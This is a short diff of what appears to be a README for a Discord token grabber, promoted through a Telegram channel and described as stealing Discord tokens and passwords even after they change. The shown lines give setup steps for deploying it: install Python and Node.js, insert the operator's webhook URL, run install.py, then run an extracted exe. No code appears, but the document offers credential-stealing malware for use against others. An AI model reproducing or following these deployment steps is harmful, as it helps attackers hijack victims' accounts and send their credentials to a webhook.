@@ -9,8 +9,11 @@ t.me/dxlstealer
 The new modern discord token grabber & token stealer, with discord password & token even when it changes
 
 1- Python + nodejs Dowload
+
 2- your webhook replace for webhook url.txt
+
 3- run install.py
+
 4- extract to folder.zip run the exe in the file
 
 
